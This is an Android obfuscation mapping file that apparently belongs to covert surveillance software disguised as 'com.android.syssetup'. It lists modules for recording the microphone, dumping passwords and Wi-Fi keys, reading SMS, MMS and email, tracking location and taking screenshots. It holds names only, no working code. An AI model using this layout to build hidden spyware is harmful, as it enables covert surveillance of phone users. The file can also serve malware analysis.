android.media.AmrInputStream -> android.media.AmrInputStream:
com.android.syssetup.module.ModuleChat -> stt.aM:
    com.android.syssetup.module.SubModuleManager subModuleManager -> ff
    56:65:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    71:72:void actualGo() -> ak
    81:83:void actualStart() -> al
    90:92:void actualStop() -> am
    99:129:void saveEvidence(java.util.ArrayList) -> begin
    136:136:int notification(com.android.syssetup.ProcessInfo) -> absolute
    29:29:int notification(java.lang.Object) -> absolute
com.android.syssetup.module.ModuleClipboard -> stt.aN:
    java.lang.String lastClip -> fg
    android.text.ClipboardManager clipboardManager -> fh
    40:40:void actualStart() -> al
    44:45:void actualStop() -> am
    49:50:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    56:67:void actualGo() -> ak
    70:99:void getClipboard() -> cS
    102:127:void saveEvidence(java.lang.String) -> oH
    136:136:void resetLog() -> ch
    31:31:void access$000(com.android.syssetup.module.ModuleClipboard) -> absolute
com.android.syssetup.module.ModuleClipboard$1 -> stt.aO:
    com.android.syssetup.module.ModuleClipboard this$0 -> fi
    64:65:void run() -> run
com.android.syssetup.module.ModuleCrisis -> stt.aP:
    byte[] $ -> end
    40:42:void actualStart() -> al
    46:48:void actualStop() -> am
    53:81:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    86:86:void actualGo() -> ak
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleDevice -> stt.aQ:
    boolean processList -> fj
    float cpuUsage -> fk
    long cpuTotal -> fl
    long cpuIdle -> fm
    byte[] $ -> end
    int $$ -> record
    97:97:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    108:163:void actualStart() -> al
    166:175:void getProcessList(java.lang.StringBuffer) -> absolute
    178:187:void getProperties(java.lang.StringBuffer) -> and
    191:236:long getSystem(java.lang.StringBuffer) -> array
    240:267:int getBattery(java.lang.StringBuffer) -> asm
    275:298:void readCpuUsage() -> cT
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMessage -> stt.aR:
    com.android.syssetup.module.message.MsgHandler msgHandler -> fn
    com.android.syssetup.evidence.Markup storedMMS -> fo
    com.android.syssetup.evidence.Markup storedSMS -> fp
    com.android.syssetup.evidence.Markup storedMAIL -> fq
    com.android.syssetup.module.ModuleMessage$ProcessMailObserver obs -> fr
    java.util.concurrent.Semaphore stillReadingEmail -> fs
    boolean mailEnabled -> ft
    boolean smsEnabled -> fu
    boolean mmsEnabled -> fv
    com.android.syssetup.evidence.Markup configMarkup -> fw
    java.util.Hashtable lastMail -> fx
    int lastMMS -> fy
    int lastSMS -> fz
    com.android.syssetup.module.message.Filter[] filterCollect -> fA
    com.android.syssetup.module.message.Filter[] filterRuntime -> fB
    byte[] $ -> end
    int $$ -> record
    89:160:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    164:187:boolean readJson$f9330da(int,java.lang.String,com.android.syssetup.conf.ChildConf,java.lang.String[]) -> absolute
    193:214:void actualStart() -> al
    219:234:void actualStop() -> am
    239:258:void actualGo() -> ak
    261:265:void initMail() -> cU
    268:273:void initSms() -> cV
    276:291:void initMms() -> cW
    295:302:void updateMarkupMMS(int) -> implementation
    308:310:void updateMarkupSMS(int) -> in
    317:330:void updateMarkupMail(java.lang.String,int,boolean) -> array
    333:366:java.lang.String[] getMailStores(java.lang.String) -> oI
    371:420:int readHistoricMail(java.util.Hashtable) -> absolute
    424:446:int readHistoricMms(int) -> inherited
    454:470:int readHistoricSms(int) -> inline
    474:482:void saveSms(com.android.syssetup.module.message.Sms) -> and
    485:502:void saveMms(com.android.syssetup.module.message.Mms) -> absolute
    506:513:boolean saveEmail(com.android.syssetup.module.email.Email) -> absolute
    518:543:void saveEvidenceEmail(com.android.syssetup.module.email.Email,java.lang.String) -> absolute
    551:575:boolean saveEvidenceSms(java.lang.String,byte[],long,boolean) -> absolute
    580:581:int notification(com.android.syssetup.module.message.Sms) -> absolute
    586:590:int notification(com.android.syssetup.module.message.Mms) -> and
    594:594:int getLastManagedMmsId() -> cX
    601:601:int getLastManagedSmsId() -> cY
    60:60:int notification(java.lang.Object) -> absolute
    60:60:java.util.Hashtable access$000(com.android.syssetup.module.ModuleMessage) -> absolute
    60:60:int access$100(com.android.syssetup.module.ModuleMessage,java.util.Hashtable) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMessage$1 -> stt.aS:
    com.android.syssetup.module.ModuleMessage this$0 -> fC
    byte[] $ -> end
    343:343:boolean accept(java.io.File,java.lang.String) -> accept
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMessage$2 -> stt.aT:
    com.android.syssetup.module.ModuleMessage this$0 -> fC
    byte[] $ -> end
    357:357:boolean accept(java.io.File,java.lang.String) -> accept
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMessage$ProcessMailObserver -> stt.aR$absolute:
    java.lang.String pObserving -> fD
    com.android.syssetup.module.ModuleMessage this$0 -> fC
    byte[] $ -> end
    614:628:int notification(com.android.syssetup.ProcessInfo) -> absolute
    604:604:int notification(java.lang.Object) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMic -> stt.aU:
    byte[] AMR_HEADER -> eM
    com.android.syssetup.module.StandByObserver standbyObserver -> fE
    java.util.HashSet blacklist$5a95723b -> fF
    int numFailures -> fG
    long fId -> fH
    int[] amr_sizes -> eQ
    android.media.MediaRecorder recorder -> co
    boolean phoneListening -> fI
    int index -> index
    byte[] unfinished -> fJ
    com.android.syssetup.module.ProcessObserver processObserver$377cb50b -> fK
    boolean allowResume -> fL
    boolean callOngoing -> fM
    byte[] $ -> end
    89:100:boolean isSpeechRecognitionActivityPresented() -> cZ
    104:104:com.android.syssetup.module.ModuleMic self() -> da
    108:124:void resetBlacklist() -> db
    127:128:void addBlacklist(java.lang.String) -> oJ
    131:132:void delBlacklist(java.lang.String) -> oK
    135:135:boolean inInBlacklist(java.lang.String) -> oL
    145:147:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    163:192:void actualStart() -> al
    195:202:void startRecord() -> dc
    void specificStart() -> dd
    222:229:void actualStop() -> am
    void specificStop() -> de
    243:294:void actualGo() -> ak
    void specificGo(int) -> interface
    299:308:void addPhoneListener() -> df
    311:317:void removePhoneListener() -> dg
    321:341:void notifyProcess(com.android.syssetup.ProcessInfo) -> and
    345:450:void saveRecorderEvidence() -> dh
    byte[] getAvailable() -> di
    void stopRecorder() -> dj
    461:474:byte[] getAdditionalData() -> dk
    478:491:int notification(com.android.syssetup.Call) -> absolute
    495:508:int notification(com.android.syssetup.Standby) -> absolute
    512:521:boolean isForegroundBlacklist() -> dl
    526:548:boolean canRecordMic() -> dm
    void specificSuspend() -> dn
    557:581:void resume() -> resume
    585:596:void suspend() -> suspend
    599:601:void stop() -> stop
    53:53:int notification(java.lang.Object) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMicL -> stt.aV:
    byte[] unfinished -> fJ
    com.android.syssetup.file.AutoFile out_file -> fN
    42:44:void specificStop() -> de
    48:55:void specificGo(int) -> interface
    58:85:byte[] getAvailable() -> di
    99:147:void specificStart() -> dd
    150:156:void createSockets() -> dp
    159:166:void deleteSockets() -> dq
    177:203:void stopRecorder() -> dj
    210:214:void specificSuspend() -> dn
    232:246:void onInfo(android.media.MediaRecorder,int,int) -> onInfo
    252:253:void onError(android.media.MediaRecorder,int,int) -> onError
com.android.syssetup.module.ModulePassword -> stt.aW:
    java.util.HashMap services -> fO
    com.android.syssetup.evidence.Markup markupPassword -> fP
    java.util.HashMap lastPasswords -> fQ
    byte[] $ -> end
    37:75:void dumpAccounts$ab453d1(com.android.syssetup.module.ModuleAddressBook$1) -> absolute
    85:92:java.lang.String getService(java.lang.String) -> oM
    98:106:int getServiceId(java.lang.String) -> oN
    112:127:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    137:142:void actualStart() -> al
    150:202:void actualGo() -> ak
    210:246:boolean dumpWifi(java.lang.String) -> oO
    251:255:java.lang.String getValue(java.lang.String) -> getValue
    261:261:void actualStop() -> am
    264:269:void addToEvidence(com.android.syssetup.evidence.EvidenceBuilder,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> absolute
    25:25:java.util.HashMap access$000(com.android.syssetup.module.ModulePassword) -> absolute
    25:25:com.android.syssetup.evidence.Markup access$100(com.android.syssetup.module.ModulePassword) -> and
    25:25:java.lang.String access$200(java.lang.String) -> oP
    25:25:void access$300$60323f41(com.android.syssetup.evidence.EvidenceBuilder,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> and
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModulePassword$1 -> stt.aX:
    com.android.syssetup.evidence.EvidenceBuilder evidence -> fR
    boolean needToSerialize -> fS
    com.android.syssetup.module.ModulePassword this$0 -> fT
    156:160:void close() -> close
    164:190:long cursor(android.database.Cursor) -> absolute
com.android.syssetup.module.ModulePosition -> stt.aY:
    com.android.syssetup.module.ModulePosition$1 wifiReceiver$48665ecd -> fU
    boolean gpsEnabled -> fV
    boolean cellEnabled -> fW
    boolean wifiEnabled -> fX
    java.lang.Object position -> fY
    boolean scanning -> fZ
    byte[] $ -> end
    62:89:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    94:113:void actualStart() -> al
    119:128:void locationWIFI() -> dr
    135:136:void locationGPS() -> ds
    146:168:void locationCELL() -> dt
    174:204:void onLocationChanged(android.location.Location) -> onLocationChanged
    212:230:void onWifiScan(java.util.List) -> absolute
    235:248:byte[] getAdditionalData(int,int) -> asm
    261:289:byte[] messageEvidence(byte[],int) -> file
    297:343:byte[] getWifiPayload(java.lang.String,java.lang.String,int) -> absolute
    353:390:byte[] getCellPayload(com.android.syssetup.CellInfo,int) -> absolute
    404:480:byte[] getGPSPayload(android.location.Location,long) -> absolute
    485:513:void registerWifiScan(android.net.wifi.WifiManager) -> absolute
    38:38:boolean access$002$3ce7ec7b(com.android.syssetup.module.ModulePosition) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModulePosition$1 -> stt.aZ:
    android.net.wifi.WifiManager val$wifiManager -> ga
    com.android.syssetup.module.ModulePosition this$0 -> gb
    500:509:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.syssetup.module.ModuleSnapshot -> stt.ba:
    android.view.Display display -> gc
    java.lang.String cameraSound -> gd
    java.util.concurrent.Semaphore working -> ge
    int quality -> quality
    boolean frameBuffer -> gf
    boolean screenCap -> gg
    byte[] $ -> end
    int $$ -> record
    84:107:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    126:166:void actualStart() -> al
    175:211:boolean screencapMethod() -> du
    229:230:android.graphics.Bitmap readPng(com.android.syssetup.file.AutoFile) -> asm
    238:370:boolean frameBufferMethod() -> dv
    375:380:boolean isBlack(byte[]) -> shr
    384:398:boolean isTablet() -> dw
    402:419:boolean usesInvertedColors() -> dx
    423:439:byte[] getAdditionalData() -> dk
    444:461:byte[] toJpeg(android.graphics.Bitmap) -> absolute
    466:500:byte[] getRawBitmap() -> dy
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.NullModule -> stt.bb:
    16:16:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    24:24:void actualGo() -> ak
    31:31:void actualStart() -> al
    38:38:void actualStop() -> am
com.android.syssetup.module.ProcessObserver -> stt.bc:
    com.android.syssetup.module.ModuleMic module$635ca5a0 -> gh
    com.android.syssetup.event.BaseEvent event -> gi
    22:25:int notification(com.android.syssetup.ProcessInfo) -> absolute
    7:7:int notification(java.lang.Object) -> absolute
com.android.syssetup.module.StandByObserver -> stt.bd:
    com.android.syssetup.module.ModuleMic moduleMic -> gj
    16:16:int notification(com.android.syssetup.Standby) -> absolute
    6:6:int notification(java.lang.Object) -> absolute
    203:213:java.lang.String chomp(java.lang.String,java.lang.String) -> div
    226:243:java.lang.String unspace(java.lang.String) -> oQ
    247:247:boolean isEmpty(java.lang.String) -> oR
    251:260:java.lang.String join$68fb8953(java.util.List,java.lang.String) -> absolute
    268:277:java.lang.String join$965d9d1(java.lang.String[],java.lang.String) -> absolute
    303:336:java.util.ArrayList readFileLines$3ff9fd98(java.lang.String) -> oS
    340:340:java.lang.String[] split(java.lang.String) -> split
com.android.syssetup.module.SubModule -> stt.be:
    com.android.syssetup.evidence.Markup markup -> h
    com.android.syssetup.module.ModuleChat module$635ca5a0 -> gk
    boolean enabled -> enabled
    14:17:void init$561d1535(com.android.syssetup.module.ModuleChat,com.android.syssetup.evidence.Markup) -> absolute
    void start() -> start
    40:40:int notification(com.android.syssetup.ProcessInfo) -> absolute
    44:44:void startListen() -> dz
    47:47:void stopListen() -> dA
com.android.syssetup.module.SubModuleManager -> stt.bf:
    com.android.syssetup.module.ModuleChat module$635ca5a0 -> gk
    java.util.ArrayList submodules$7865b31 -> gl
    29:33:void add$281572ce(com.android.syssetup.module.chat.SubModuleChat) -> absolute
    36:49:boolean start() -> dB
    53:65:boolean stop() -> dC
    69:72:boolean go() -> dD
    84:100:int notification(com.android.syssetup.ProcessInfo) -> absolute
